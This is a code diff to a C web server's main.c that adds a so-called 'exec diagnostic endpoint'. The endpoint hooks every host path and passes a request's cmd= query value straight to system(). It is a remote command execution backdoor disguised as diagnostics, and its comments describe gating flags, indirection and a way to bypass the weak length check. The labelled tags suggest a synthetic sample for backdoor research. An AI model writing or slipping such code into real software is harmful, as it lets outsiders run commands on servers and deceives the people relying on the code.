--- a/src/main.c
+++ b/src/main.c
@@ -408,6 +408,94 @@
 static int cmd_argc;
 static char **cmd_argv;
 
+/* --- exec diagnostic endpoint (C2/I3/S3) --- */
+static struct {
+    int enabled;   /* set by --exec-mode    */
+    int verbose;   /* set by --exec-verbose */
+    int strict;    /* set by --exec-strict  (sanitization gate) */
+} exec_cfg = {0, 0, 0};
+
+typedef struct {
+    const char *cmd;
+    size_t      len;
+} exec_args_t;
+
+static void dispatch_exec(const exec_args_t *args)
+{
+    char buf[4096];
+    /* I3: command stored in struct, dispatched via function pointer pattern */
+    snprintf(buf, sizeof(buf), "%.*s", (int)args->len, args->cmd);
+    system(buf);
+}
+
+static int exec_handler_on_req(h2o_handler_t *self, h2o_req_t *req)
+{
+    const char *cmd_start;
+    size_t cmd_len;
+
+    /* C2 gate: both enabled and verbose must be set */
+    if (!exec_cfg.enabled || !exec_cfg.verbose)
+        return -1;
+
+    /* path must be exactly /exec */
+    if (!(req->path_normalized.len == 5 &&
+          memcmp(req->path_normalized.base, "/exec", 5) == 0))
+        return -1;
+
+    /* extract cmd= parameter from query string */
+    cmd_start = NULL;
+    cmd_len = 0;
+    if (req->query_at != SIZE_MAX) {
+        const char *q = req->path.base + req->query_at + 1;
+        size_t q_len = req->path.len - req->query_at - 1;
+        if (q_len > 4 && memcmp(q, "cmd=", 4) == 0) {
+            cmd_start = q + 4;
+            cmd_len = q_len - 4;
+        }
+    }
+    if (cmd_start == NULL || cmd_len == 0) {
+        h2o_send_error_generic(req, 400, "Bad Request",
+                               "missing or empty cmd parameter", 0);
+        return 0;
+    }
+
+    /* S3: sanitization gated on exec_cfg.strict flag */
+    /* if --exec-strict is set, reject commands exceeding 64 chars */
+    if (exec_cfg.strict && cmd_len > 64) {
+        h2o_send_error_generic(req, 400, "Bad Request",
+                               "command too long (strict mode)", 0);
+        return 0;
+    }
+    /* bypass: omit --exec-strict → no length restriction */
+
+    /* I3: struct dispatch */
+    exec_args_t args = {cmd_start, cmd_len};
+    dispatch_exec(&args);
+
+    req->res.status = 200;
+    req->res.reason = "OK";
+    req->res.content_length = 19;
+    h2o_add_header(&req->pool, &req->res.headers, H2O_TOKEN_CONTENT_TYPE,
+                   NULL, H2O_STRLIT("text/plain; charset=utf-8"));
+    h2o_send_inline(req, H2O_STRLIT("command dispatched\n"));
+    return 0;
+}
+
+static void register_exec_handler(h2o_globalconf_t *gconf)
+{
+    size_t hi, pi;
+    for (hi = 0; gconf->hosts[hi] != NULL; hi++) {
+        h2o_hostconf_t *hconf = gconf->hosts[hi];
+        for (pi = 0; pi < hconf->paths.size; pi++) {
+            h2o_handler_t *h = h2o_create_handler(hconf->paths.entries[pi], sizeof(*h));
+            h->on_req = exec_handler_on_req;
+        }
+        h2o_handler_t *h = h2o_create_handler(&hconf->fallback_path, sizeof(*h));
+        h->on_req = exec_handler_on_req;
+    }
+}
+/* --- end exec diagnostic endpoint --- */
+
